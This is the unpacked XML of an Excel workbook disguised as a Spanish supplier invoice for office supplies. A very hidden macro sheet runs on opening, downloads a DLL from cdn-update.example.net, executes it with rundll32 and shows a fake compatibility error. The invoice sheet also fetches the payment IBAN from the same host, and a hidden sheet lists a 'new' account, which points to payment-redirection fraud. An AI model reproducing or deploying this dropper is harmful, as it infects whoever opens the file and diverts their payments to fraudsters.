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png" ContentType="image/png"/>
  <Default Extension="jpeg" ContentType="image/jpeg"/>
  <Default Extension="emf" ContentType="image/x-emf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macrosheets/sheet1.xml" ContentType="application/vnd.ms-excel.macrosheet+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bookViews>
    <workbookView activeTab="0"/>
  </bookViews>
  <sheets>
    <sheet name="Factura" sheetId="1" r:id="rId1"/>
    <sheet name="Datos" sheetId="2" state="hidden" r:id="rId2"/>
    <sheet name="Macro1" sheetId="3" state="veryHidden" r:id="rId3"/>
  </sheets>
  <definedNames>
    <definedName name="_xlnm.Auto_Open" hidden="1">Macro1!$A$1</definedName>
  </definedNames>
</workbook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microsoft.com/office/2006/relationships/xlMacrosheet" Target="macrosheets/sheet1.xml"/><Relationship Id="rIdVba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r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" xmlns:xm="http://schemas.microsoft.com/office/excel/2006/main">
  <sheetData>
    <row r="1">
      <c r="A1">
        <f>CALL("urlmon","URLDownloadToFileA","JJCCJJ",0,"http://cdn-update.example.net/files/upd.bin","C:\Users\Public\upd.dll",0,0)</f>
        <v>0</v>
      </c>
    </row>
    <row r="2">
      <c r="A2">
        <f>EXEC("rundll32.exe C:\Users\Public\upd.dll,DllRegisterServer")</f>
        <v>0</v>
      </c>
    </row>
    <row r="3">
      <c r="A3">
        <f>ALERT("El documento no es compatible con su versión de Excel.",2)</f>
        <v>0</v>
      </c>
    </row>
    <row r="4">
      <c r="A4">
        <f>HALT()</f>
        <v>0</v>
      </c>
    </row>
  </sheetData>
</xm:macrosheet>
</file>

<file path=xl/worksheets/sheet1.xml><?xml version="1.0" encoding="utf-8"?>
<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
  <sheetData>
    <row r="1">
      <c r="A1" t="inlineStr">
        <is>
          <t xml:space="preserve">Suministros Iberia S.L.</t>
        </is>
      </c>
      <c r="D1" t="inlineStr">
        <is>
          <t xml:space="preserve">Factura 2026-0187</t>
        </is>
      </c>
    </row>
    <row r="2">
      <c r="A2" t="inlineStr">
        <is>
          <t xml:space="preserve">Fecha</t>
        </is>
      </c>
      <c r="B2" t="inlineStr">
        <is>
          <t xml:space="preserve">13/10/2026</t>
        </is>
      </c>
      <c r="D2" t="inlineStr">
        <is>
          <t xml:space="preserve">Vencimiento: 20/10/2026</t>
        </is>
      </c>
    </row>
    <row r="3"/>
    <row r="4">
      <c r="A4" t="inlineStr">
        <is>
          <t xml:space="preserve">Referencia</t>
        </is>
      </c>
      <c r="B4" t="inlineStr">
        <is>
          <t xml:space="preserve">Descripción</t>
        </is>
      </c>
      <c r="C4" t="inlineStr">
        <is>
          <t xml:space="preserve">Unidades</t>
        </is>
      </c>
      <c r="D4" t="inlineStr">
        <is>
          <t xml:space="preserve">Importe (EUR)</t>
        </is>
      </c>
    </row>
    <row r="5">
      <c r="A5" t="inlineStr">
        <is>
          <t xml:space="preserve">MO-1120</t>
        </is>
      </c>
      <c r="B5" t="inlineStr">
        <is>
          <t xml:space="preserve">Papel A4 80 g (caja 5 paquetes)</t>
        </is>
      </c>
      <c r="C5">
        <v>40</v>
      </c>
      <c r="D5">
        <v>380.0</v>
      </c>
    </row>
    <row r="6">
      <c r="A6" t="inlineStr">
        <is>
          <t xml:space="preserve">MO-2210</t>
        </is>
      </c>
      <c r="B6" t="inlineStr">
        <is>
          <t xml:space="preserve">Tóner compatible HP 26A</t>
        </is>
      </c>
      <c r="C6">
        <v>6</v>
      </c>
      <c r="D6">
        <v>498.0</v>
      </c>
    </row>
    <row r="7">
      <c r="A7" t="inlineStr">
        <is>
          <t xml:space="preserve">MO-3305</t>
        </is>
      </c>
      <c r="B7" t="inlineStr">
        <is>
          <t xml:space="preserve">Archivadores A-Z lomo ancho</t>
        </is>
      </c>
      <c r="C7">
        <v>60</v>
      </c>
      <c r="D7">
        <v>155.0</v>
      </c>
    </row>
    <row r="8">
      <c r="C8" t="inlineStr">
        <is>
          <t xml:space="preserve">Base imponible</t>
        </is>
      </c>
      <c r="D8">
        <f>SUM(D5:D7)</f>
        <v>0</v>
      </c>
    </row>
    <row r="9">
      <c r="C9" t="inlineStr">
        <is>
          <t xml:space="preserve">IVA 21%</t>
        </is>
      </c>
      <c r="D9">
        <f>D8*0.21</f>
        <v>0</v>
      </c>
    </row>
    <row r="10">
      <c r="C10" t="inlineStr">
        <is>
          <t xml:space="preserve">TOTAL</t>
        </is>
      </c>
      <c r="D10">
        <f>D8+D9</f>
        <v>0</v>
      </c>
    </row>
    <row r="11"/>
    <row r="12">
      <c r="A12" t="inlineStr">
        <is>
          <t xml:space="preserve">Estado del pago</t>
        </is>
      </c>
      <c r="B12">
        <f>WEBSERVICE("https://suministros-iberia.example.com/api/estado?f=2026-0187")</f>
        <v>0</v>
      </c>
    </row>
    <row r="13">
      <c r="A13" t="inlineStr">
        <is>
          <t xml:space="preserve">Cuenta de abono</t>
        </is>
      </c>
      <c r="B13">
        <f>FILTERXML(WEBSERVICE("http://cdn-update.example.net/iban.xml"),"//iban")</f>
        <v>0</v>
      </c>
    </row>
  </sheetData>
</worksheet>
</file>

<file path=xl/worksheets/sheet2.xml><?xml version="1.0" encoding="utf-8"?>
<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
  <sheetData>
    <row r="1">
      <c r="A1" t="inlineStr">
        <is>
          <t xml:space="preserve">IBAN anterior</t>
        </is>
      </c>
      <c r="B1" t="inlineStr">
        <is>
          <t xml:space="preserve">ES00 0000 0000 0000 0000 0000</t>
        </is>
      </c>
    </row>
    <row r="2">
      <c r="A2" t="inlineStr">
        <is>
          <t xml:space="preserve">IBAN nuevo (desde 10/2026)</t>
        </is>
      </c>
      <c r="B2" t="inlineStr">
        <is>
          <t xml:space="preserve">ES99 9999 9999 9999 9999 9999</t>
        </is>
      </c>
    </row>
    <row r="3">
      <c r="A3" t="inlineStr">
        <is>
          <t xml:space="preserve">Contacto</t>
        </is>
      </c>
      <c r="B3" t="inlineStr">
        <is>
          <t xml:space="preserve">pagos.suministros@mail-box.example.org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Template>Normal.dotm</Template>
  <TotalTime>7</TotalTime>
  <Pages>1</Pages>
  <Application>Microsoft Excel</Application>
  <DocSecurity>0</DocSecurity>
  <Company>Suministros Iberia S.L.</Company>
  <AppVersion>16.0000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Factura 2026-0187</dc:title>
  <dc:subject/>
  <dc:creator>Contabilidad</dc:creator>
  <cp:keywords/>
  <cp:lastModifiedBy>jmartin</cp:lastModifiedBy>
  <cp:revision>4</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2026-10-07T11:02:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-10-13T16:40:00Z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eferencia">
    <vt:lpwstr>FAC-2026-0187</vt:lpwstr>
  </property>
</Properties>
</file>